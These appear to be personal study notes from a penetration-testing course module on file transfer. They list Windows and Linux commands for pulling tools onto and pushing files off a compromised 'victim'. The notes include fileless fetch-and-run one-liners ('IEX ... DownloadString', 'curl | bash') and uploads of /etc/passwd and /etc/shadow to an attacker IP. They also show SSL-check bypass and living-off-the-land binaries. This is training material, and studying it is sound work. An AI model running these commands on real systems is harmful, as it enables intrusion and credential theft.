---
title: File Transfer Notes
date: 2025-08-04
categories: [Notes, HTB Academy]
tags: [HTB, Notes]
description: Notes for the 'File Transfer' module from HTB Academy
---

## 🪟 Windows

### 📥 Downloading to Target
**1. Base64 Encoding**
- Encode on your machine, paste and decode on target.

**2. PowerShell Methods (`Net.WebClient`)**
- `DownloadFile`: `(New-Object Net.WebClient).DownloadFile('URL','output')`
- `DownloadFileAsync`: `(New-Object Net.WebClient).DownloadFileAsync('URL','output')`
- `DownloadString`: `IEX (New-Object Net.WebClient).DownloadString('url')`
- `Invoke-WebRequest`: 
  - `Invoke-WebRequest [url] -OutFile [file]`
  - Use `-UseBasicParsing` if needed.
  - Bypass SSL errors:  
    `[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}`

**3. SMB**
- Sender:
  ```bash
  sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
  ```
- Receiver:
  ```bash
  net use n: \\IP\share /user:test test
  copy n:\nc.exe
  ```

**4. FTP**
- Sender:
  ```bash
  sudo pip3 install pyftpdlib
  sudo python3 -m pyftpdlib --port 21
  ```
- Receiver:
  ```bash
  (New-Object Net.WebClient).DownloadFile('ftp://IP/file.txt','C:\path\file.txt')
  ```
- Command file method:
  Create a script file with FTP commands, then run:
  ```bash
  ftp -v -n -s:ftpcommand.txt
  ```

---

### 📤 Uploading from Target

**1. Base64 Encoding**  
Encode, transfer, decode.

**2. PowerShell Web Upload (Invoke-RestMethod)**  
- Receiver:
  ```bash
  python3 -m uploadserver
  ```
- Sender:
  ```powershell
  IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
  Invoke-FileUpload -Uri http://IP:PORT/upload -File <file>
  ```

**3. SMB via WebDav**
- Receiver:
  ```bash
  sudo pip3 install wsgidav cheroot
  sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
  ```
- Sender:
  ```bash
  copy C:\path\file.zip \\IP\DavWWWRoot\
  ```

**4. FTP Upload**
```powershell
(New-Object Net.WebClient).UploadFile('ftp://IP/file','C:\path\file')
```

---

## 🐧 Linux

### 📥 Downloading to Victim

**1. Base64**
```bash
cat id_rsa | base64 -w 0
```

**2. Web Downloads**
- Curl: `curl [url] -o [file]`
- Wget: `wget [url] -O [file]`
- Fileless: `curl [url] | bash`

**3. Bash Socket**
```bash
exec 3<>/dev/tcp/IP/80
echo -e "GET /LinEnum.sh HTTP/1.1\n\n" >&3
cat <&3
```

**4. SSH**
- Sender:
  ```bash
  sudo systemctl enable ssh
  sudo systemctl start ssh
  ```
- Receiver:
  ```bash
  scp user@IP:/path/to/file .
  ```

---

### 📤 Uploading from Victim

**1. Web Upload**
- Receiver:
  ```bash
  python3 -m uploadserver 443 --server-certificate server.pem
  ```
- Victim:
  ```bash
  curl -X POST https://IP/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
  ```

**2. Alternate Uploads**
- Web servers:
  ```bash
  python3 -m http.server
  php -S 0.0.0.0:8000
  ruby -run -ehttpd . -p8000
  ```

- Download:
  ```bash
  wget http://IP:8000/file.txt
  ```

**3. SCP**
```bash
scp /etc/passwd user@IP:/path/
```

---

## 💻 Transfer via Code

**Python**
```bash
python2 -c 'import urllib;urllib.urlretrieve ("URL","file")'
python3 -c 'import urllib.request;urllib.request.urlretrieve("URL","file")'
```

**PHP**
```php
php -r '$f=file_get_contents("URL");file_put_contents("file",$f);'
```

**Ruby**
```ruby
ruby -e 'require "net/http"; File.write("file", Net::HTTP.get(URI.parse("URL")))'
```

**Perl**
```perl
perl -e 'use LWP::Simple; getstore("URL", "file");'
```

**JavaScript**
Create `wget.js` with WinHttp code, then:
```bash
cscript.exe /nologo wget.js URL filename
```

**VBScript**
Create `wget.vbs`, then:
```bash
cscript.exe /nologo wget.vbs URL filename
```

---

## 🐍 Upload with Python

- Receiver:
```bash
python3 -m uploadserver
```

- Sender:
```bash
python3 -c 'import requests;requests.post("http://IP:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

---

## ⚙️ Miscellaneous Methods

### 🛜 Netcat/Ncat:
- Can be used to transfer files via TCP sockets, but avoid if encrypted channels are required.

### 🖥️ Rdesktop:
- Useful for downloading/uploading files when RDP is enabled. Use drag-and-drop or clipboard transfer if possible.

---

## 🔐 Encrypted Transfer

```bash
# Encrypt
openssl enc -aes256 -in file.txt -out file.enc

# Decrypt
openssl enc -aes256 -d -in file.enc -out file.txt
```

---

## 🧱 Living Off The Land (LOTL)

### 🧰 LOLBAS (Living Off The Land Binaries and Scripts)
- Binaries already present in Windows that can be abused by attackers.
- Examples: `certutil`, `mshta`, `regsvr32`, `powershell`, `wmic`

🔗 [https://lolbas-project.github.io/](https://lolbas-project.github.io/)

### 🔨 GTFOBins
- Linux equivalent of LOLBAS.
- Collection of binaries that can be exploited for privilege escalation, file access, execution, etc.

🔗 [https://gtfobins.github.io/](https://gtfobins.github.io/)
